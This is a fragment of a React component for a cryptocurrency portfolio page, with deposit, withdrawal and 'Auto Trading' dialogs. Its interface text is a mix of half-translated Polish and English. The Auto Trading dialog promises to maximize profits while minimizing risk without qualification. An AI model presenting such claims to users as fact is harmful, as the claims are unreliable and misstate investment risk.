                <SelectTrigger id="crypto">
                  <SelectValue placeholder="Wybierz krypto" />
                </SelectTrigger>
                <SelectContent>
                  {Object.entries(cryptoAddresses).map(([key, { name }]) => (
                    <SelectItem key={key} value={key}>
                      {name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            
            {selectedCrypto && (
              <div className="space-y-4">
                <div className="flex justify-center p-4 bg-white rounded-lg">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${cryptoAddresses[selectedCrypto].address}`}
                    alt="QR Code"
                    className="w-48 h-48"
                  />
                </div>
                
                <div className="space-y-2">
                  <Label>Wpłać Address</Label>
                  <div className="flex gap-2">
                    <Input
                      value={cryptoAddresses[selectedCrypto].address}
                      readOnly
                      className="font-mono text-xs"
                    />
                    <Button
                      size="icon"
                      variant="outline"
                      onClick={() => copyToClipboard(cryptoAddresses[selectedCrypto].address)}
                    >
                      {copied ? <CheckCircle2 className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>
          <DialogFooter>
            <Button onClick={() => setWpłaćDialogOpen(false)}>
              Zamknij
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      
      <Dialog open={withdrawDialogOpen} onOpenChange={setWypłaćDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <ArrowUpFromLine className="w-5 h-5 text-destructive" />
              Wypłać Cryptocurrency
            </DialogTitle>
            <DialogDescription>
              Wypłać crypto from your portfolio to an external wallet address.
            </DialogDescription>
          </DialogHeader>
          
          {withdrawSuccess ? (
            <div className="py-8 text-center space-y-4">
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-success/20 rounded-full flex items-center justify-center">
                  <CheckCircle2 className="w-10 h-10 text-success" />
                </div>
              </div>
              <div>
                <h3 className="text-xl font-bold text-success mb-2">Wypłać Successful!</h3>
                <p className="text-sm text-muted-foreground">
                  {withdrawAmount} {withdrawCrypto.toUpperCase()} has been deducted from your portfolio.
                </p>
              </div>
            </div>
          ) : (
            <>
              <div className="space-y-4 py-4">
                <div className="space-y-2">
                  <Label htmlFor="withdrawCrypto">Wybierz kryptowalutę</Label>
                  <Select value={withdrawCrypto} onValueChange={setWypłaćCrypto} disabled={withdrawing}>
                    <SelectTrigger id="withdrawCrypto">
                      <SelectValue placeholder="Wybierz krypto to withdraw" />
                    </SelectTrigger>
                    <SelectContent>
                      {getUserCryptoAktywa().length > 0 ? (
                        getUserCryptoAktywa().map(({ coinId, amount }) => (
                          <SelectItem key={coinId} value={coinId}>
                            {coinId.toUpperCase()} (Dostępne: {parseFloat(amount).toFixed(8)})
                          </SelectItem>
                        ))
                      ) : (
                        <SelectItem value="none" disabled>
                          No crypto holdings available
                        </SelectItem>
                      )}
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="withdrawAmount">Amount</Label>
                  <Input
                    id="withdrawAmount"
                    type="number"
                    step="0.00000001"
                    min="0"
                    placeholder="0.00000000"
                    value={withdrawAmount}
                    onChange={(e) => setWypłaćAmount(e.target.value)}
                    disabled={withdrawing || !withdrawCrypto}
                  />
                  {withdrawCrypto && portfolio && (
                    <p className="text-xs text-muted-foreground">
                      Dostępne: {portfolio.holdings[withdrawCrypto]?.amount || '0'} {withdrawCrypto.toUpperCase()}
                    </p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="withdrawAddress">Docelowy adres portfela</Label>
                  <Input
                    id="withdrawAddress"
                    type="text"
                    placeholder={withdrawCrypto ? getAddressPlaceholder(withdrawCrypto) : 'Enter wallet address'}
                    value={withdrawAddress}
                    onChange={(e) => {
                      setWypłaćAddress(e.target.value);
                      setAddressError('');
                    }}
                    disabled={withdrawing || !withdrawCrypto}
                    className={`font-mono text-xs ${addressError ? 'border-destructive' : ''}`}
                  />
                  {addressError && (
                    <p className="text-xs text-destructive">{addressError}</p>
                  )}
                  {withdrawAddress && withdrawCrypto && !addressError && validateWalletAddress(withdrawCrypto, withdrawAddress) && (
                    <p className="text-xs text-success flex items-center gap-1">
                      <CheckCircle2 className="w-3 h-3" />
                      Poprawny format adresu
                    </p>
                  )}
                </div>
              </div>
              <DialogFooter>
                <Button
                  variant="outline"
                  onClick={() => setWypłaćDialogOpen(false)}
                  disabled={withdrawing}
                >
                  Anuluj
                </Button>
                <Button
                  onClick={handleWypłać}
                  disabled={withdrawing || !withdrawAmount || !withdrawCrypto || !withdrawAddress}
                  variant="destructive"
                >
                  {withdrawing ? 'Przetwarzanie...' : 'Wypłać'}
                </Button>
              </DialogFooter>
            </>
          )}
        </DialogContent>
      </Dialog>

      <Dialog open={aiDialogOpen} onOpenChange={setAiDialogOpen}>
        <DialogContent>
          {aiSuccess ? (
            <div className="py-8 text-center space-y-4">
              <div className="flex justify-center">
                <div className="w-20 h-20 bg-success/20 rounded-full flex items-center justify-center">
                  <Sparkles className="w-10 h-10 text-success" />
                </div>
              </div>
              <div>
                <h3 className="text-2xl font-bold text-success mb-2">Auto Trading is Now Enabled!</h3>
                <p className="text-lg text-muted-foreground">Your Auto Trading assistant is active</p>
                <p className="text-sm text-muted-foreground mt-2">Our Auto will analyze market conditions and optimize your portfolio 24/7</p>
              </div>
              <Button onClick={() => { setAiDialogOpen(false); setAiSuccess(false); }} className="mt-4">
                Got it
              </Button>
            </div>
          ) : aiTradingEnabled ? (
            <>
              <DialogHeader>
                <DialogTitle className="flex items-center gap-2">
                  <Bot className="w-5 h-5 text-success" />
                  Auto Trading Management
                </DialogTitle>
                <DialogDescription>
                  Auto Trading is currently active on your account
                </DialogDescription>
              </DialogHeader>
              <div className="py-4 space-y-3">
                <div className="flex items-start gap-3 p-3 bg-success/10 rounded-lg border border-success/20">
                  <CheckCircle2 className="w-5 h-5 text-success mt-0.5" />
                  <div>
                    <p className="font-medium text-success">Auto Trading aktywny</p>
                    <p className="text-sm text-muted-foreground">Your portfolio is being optimized automatically</p>
                  </div>
                </div>
              </div>
              <DialogFooter>
                <Button variant="outline" onClick={() => setAiDialogOpen(false)} className="bg-transparent">Zamknij</Button>
                <Button variant="destructive" onClick={handleDisableAiTrading} disabled={enablingAi}>
                  {enablingAi ? 'Disabling...' : 'Disable Auto Trading'}
                </Button>
              </DialogFooter>
            </>
          ) : (
            <>
              <DialogHeader>
                <DialogTitle className="flex items-center gap-2">
                  <Bot className="w-5 h-5 text-primary" />
                  Włącz Auto Trading
                </DialogTitle>
                <DialogDescription>
                  Let our advanced Auto algorithms analyze market trends and execute optimal trades for your portfolio.
                </DialogDescription>
              </DialogHeader>
              <div className="py-4 space-y-3">
                <div className="flex items-start gap-3 p-3 bg-muted/50 rounded-lg">
                  <Sparkles className="w-5 h-5 text-primary mt-0.5" />
                  <div>
                    <p className="font-medium">Smart Analysis</p>
                    <p className="text-sm text-muted-foreground">Auto monitors 100+ market indicators 24/7</p>
                  </div>
                </div>
                <div className="flex items-start gap-3 p-3 bg-muted/50 rounded-lg">
                  <TrendingUp className="w-5 h-5 text-success mt-0.5" />
                  <div>
                    <p className="font-medium">Optimized Returns</p>
                    <p className="text-sm text-muted-foreground">Maximize profits while minimizing risks</p>
                  </div>
                </div>
              </div>
              <DialogFooter>
                <Button variant="outline" onClick={() => setAiDialogOpen(false)} className="bg-transparent">Anuluj</Button>
                <Button onClick={handleEnableAiTrading} disabled={enablingAi} className="gap-2">
                  {enablingAi ? 'Enabling...' : 'Włącz Auto Trading'}
                </Button>
              </DialogFooter>
            </>
          )}
        </DialogContent>
      </Dialog>

      <MobileBottomNav current="portfolio" />
    </div>
  );
}
